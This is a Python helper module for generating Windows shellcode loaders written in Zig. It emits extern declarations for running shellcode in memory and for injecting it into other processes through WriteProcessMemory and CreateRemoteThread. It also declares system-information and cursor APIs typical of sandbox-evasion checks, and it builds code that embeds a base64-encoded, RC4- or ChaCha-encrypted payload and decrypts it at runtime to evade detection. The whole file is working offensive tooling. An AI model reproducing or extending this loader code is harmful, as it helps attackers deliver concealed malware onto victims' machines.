#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for pure-Zig Windows shellcode loaders (compiled via zig build-exe)."""

from __future__ import annotations


def zig_byte_array(data: bytes, name: str) -> str:
    if not data:
        return f"const {name} = [_]u8{{}};\n"
    parts = ", ".join(f"0x{b:02x}" for b in data)
    return f"const {name} = [_]u8{{ {parts} }};\n"


def zig_sleep_ms(sleep_ms: int) -> str:
    if sleep_ms <= 0:
        return ""
    return f"    Sleep({int(sleep_ms)});\n"


def zig_std_preamble() -> str:
    """Windows API via explicit externs (portable across Zig std versions)."""
    return """
const std = @import("std");
const w = std.os.windows;

extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: w.SIZE_T,
    flAllocationType: w.DWORD,
    flProtect: w.DWORD,
) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn VirtualProtect(
    lpAddress: *anyopaque,
    dwSize: w.SIZE_T,
    flNewProtect: w.DWORD,
    lpflOldProtect: *w.DWORD,
) callconv(.winapi) w.BOOL;
extern "kernel32" fn VirtualFree(lpAddress: ?*anyopaque, dwSize: w.SIZE_T, dwFreeType: w.DWORD) callconv(.winapi) w.BOOL;
extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: w.SIZE_T,
    lpStartAddress: *const anyopaque,
    lpParameter: ?*anyopaque,
    dwCreationFlags: w.DWORD,
    lpThreadId: ?*w.DWORD,
) callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn WaitForSingleObject(hHandle: w.HANDLE, dwMilliseconds: w.DWORD) callconv(.winapi) w.DWORD;
extern "kernel32" fn CloseHandle(hObject: w.HANDLE) callconv(.winapi) w.BOOL;
extern "kernel32" fn GetModuleHandleA(lpModuleName: ?[*:0]const u8) callconv(.winapi) ?w.HMODULE;
extern "kernel32" fn GetProcAddress(hModule: ?w.HMODULE, lpProcName: [*:0]const u8) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn CreateEventA(
    lpEventAttributes: ?*anyopaque,
    bManualReset: w.BOOL,
    bInitialState: w.BOOL,
    lpName: ?[*:0]const u8,
) callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn OpenProcess(dwDesiredAccess: w.DWORD, bInheritHandle: w.BOOL, dwProcessId: w.DWORD) callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn VirtualAllocEx(
    hProcess: ?w.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: w.SIZE_T,
    flAllocationType: w.DWORD,
    flProtect: w.DWORD,
) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn WriteProcessMemory(
    hProcess: ?w.HANDLE,
    lpBaseAddress: ?*anyopaque,
    lpBuffer: [*]const u8,
    nSize: w.SIZE_T,
    lpNumberOfBytesWritten: ?*w.SIZE_T,
) callconv(.winapi) w.BOOL;
extern "kernel32" fn CreateRemoteThread(
    hProcess: ?w.HANDLE,
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: w.SIZE_T,
    lpStartAddress: *const anyopaque,
    lpParameter: ?*anyopaque,
    dwCreationFlags: w.DWORD,
    lpThreadId: ?*w.DWORD,
) callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn VirtualFreeEx(
    hProcess: ?w.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: w.SIZE_T,
    dwFreeType: w.DWORD,
) callconv(.winapi) w.BOOL;
extern "kernel32" fn CreateFileA(
    lpFileName: [*:0]const u8,
    dwDesiredAccess: w.DWORD,
    dwShareMode: w.DWORD,
    lpSecurityAttributes: ?*anyopaque,
    dwCreationDisposition: w.DWORD,
    dwFlagsAndAttributes: w.DWORD,
    hTemplateFile: ?w.HANDLE,
) callconv(.winapi) w.HANDLE;
extern "kernel32" fn CreateFileMappingA(
    hFile: w.HANDLE,
    lpFileMappingAttributes: ?*anyopaque,
    flProtect: w.DWORD,
    dwMaximumSizeHigh: w.DWORD,
    dwMaximumSizeLow: w.DWORD,
    lpName: ?[*:0]const u8,
) callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: ?w.HANDLE,
    dwDesiredAccess: w.DWORD,
    dwFileOffsetHigh: w.DWORD,
    dwFileOffsetLow: w.DWORD,
    dwNumberOfBytesToMap: w.SIZE_T,
) callconv(.winapi) ?*anyopaque;
extern "kernel32" fn UnmapViewOfFile(lpBaseAddress: ?*anyopaque) callconv(.winapi) w.BOOL;
extern "kernel32" fn GlobalMemoryStatusEx(lpBuffer: *w.MEMORYSTATUSEX) callconv(.winapi) w.BOOL;
extern "kernel32" fn GetSystemInfo(lpSystemInfo: *w.SYSTEM_INFO) callconv(.winapi) void;
extern "kernel32" fn GetDiskFreeSpaceExA(
    lpDirectoryName: ?[*:0]const u8,
    lpFreeBytesAvailableToCaller: ?*w.ULARGE_INTEGER,
    lpTotalNumberOfBytes: ?*w.ULARGE_INTEGER,
    lpTotalNumberOfFreeBytes: ?*w.ULARGE_INTEGER,
) callconv(.winapi) w.BOOL;
extern "kernel32" fn GetTickCount64() callconv(.winapi) u64;
extern "kernel32" fn CreateTimerQueue() callconv(.winapi) ?w.HANDLE;
extern "kernel32" fn CreateTimerQueueTimer(
    phNewTimer: *?w.HANDLE,
    TimerQueue: ?w.HANDLE,
    Callback: *const anyopaque,
    Parameter: ?*anyopaque,
    DueTime: w.DWORD,
    Period: w.DWORD,
    Flags: w.ULONG,
) callconv(.winapi) w.BOOL;
extern "kernel32" fn DeleteTimerQueueEx(TimerQueue: ?w.HANDLE, CompletionEvent: ?w.HANDLE) callconv(.winapi) w.BOOL;
extern "kernel32" fn DeleteTimerQueue(TimerQueue: ?w.HANDLE) callconv(.winapi) w.BOOL;

extern "user32" fn EnumWindows(lpEnumFunc: *const anyopaque, lParam: w.LPARAM) callconv(.winapi) w.BOOL;
extern "user32" fn GetCursorPos(lpPoint: *w.POINT) callconv(.winapi) w.BOOL;
extern "kernel32" fn Sleep(dwMilliseconds: w.DWORD) callconv(.winapi) void;
"""


def zig_c_crypto_import(cipher: str) -> str:
    if cipher == "rc4":
        return """
const c = @cImport({
    @cInclude("windows.h");
    @cInclude("base64.h");
    @cInclude("rc4.h");
});
"""
    return """
const c = @cImport({
    @cInclude("windows.h");
    @cInclude("base64.h");
    @cInclude("chacha.h");
});
"""


def zig_decode_decrypt_preamble(
    encoded_payload: str,
    key: bytes,
    iv: bytes | None,
    *,
    cipher: str,
) -> str:
    key_arr = zig_byte_array(key, "payload_key")
    if cipher == "rc4":
        b64_len = len(encoded_payload)
        return f"""
{zig_c_crypto_import(cipher)}
const enc_payload = "{encoded_payload}";
const enc_payload_len: c_int = {b64_len};
{key_arr}

fn decodeAndDecrypt(allocator: std.mem.Allocator) ![]u8 {{
    const decoded = try allocator.alloc(u8, @intCast(enc_payload_len));
    const n = c.base64decode(decoded.ptr, enc_payload.ptr, enc_payload_len);
    if (n <= 0) return error.DecodeFailed;
    const out = try allocator.alloc(u8, @intCast(n));
    var key_mut: [payload_key.len]u8 = payload_key;
    c.RC4(&key_mut, decoded.ptr, out.ptr, @intCast(n));
    allocator.free(decoded);
    return out;
}}
"""
    if iv is None:
        raise ValueError("iv required for chacha")
    iv_arr = zig_byte_array(iv, "payload_iv")
    b64_len = len(encoded_payload)
    return f"""
{zig_c_crypto_import(cipher)}
const enc_payload = "{encoded_payload}";
const enc_payload_len: c_int = {b64_len};
{key_arr}
{iv_arr}

fn decodeAndDecrypt(allocator: std.mem.Allocator) ![]u8 {{
    const decoded = try allocator.alloc(u8, @intCast(enc_payload_len));
    const n = c.base64decode(decoded.ptr, enc_payload.ptr, enc_payload_len);
    if (n <= 0) return error.DecodeFailed;
    const out = try allocator.alloc(u8, @intCast(n));
    var ctx: c.chacha_ctx = undefined;
    var key_mut: [payload_key.len]u8 = payload_key;
    var iv_mut: [payload_iv.len]u8 = payload_iv;
    c.chacha_keysetup(&ctx, &key_mut, 256, 96);
    c.chacha_ivsetup(&ctx, &iv_mut);
    c.chacha_encrypt_bytes(&ctx, decoded.ptr, out.ptr, @intCast(n));
    allocator.free(decoded);
    return out;
}}
"""
